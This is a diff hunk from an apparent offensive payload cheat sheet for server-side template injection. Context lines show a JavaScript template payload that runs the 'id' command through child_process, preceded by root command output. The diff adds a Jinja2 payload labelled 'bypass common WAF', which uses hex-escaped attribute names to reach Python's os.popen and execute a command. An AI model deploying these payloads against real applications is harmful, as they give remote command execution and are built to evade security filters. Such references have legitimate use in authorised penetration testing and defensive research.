@@ -702,6 +702,10 @@ uid=0(root) gid=0(root) groups=0(root)
 ```js
 {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}
 ```
+#### `bypass common WAF`
+```
+{%25+include+request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("sleep+5")|attr("read")()+%}
+```
 --------------------------------------------------------------------------------
 # SSRF common payloads
 ```http
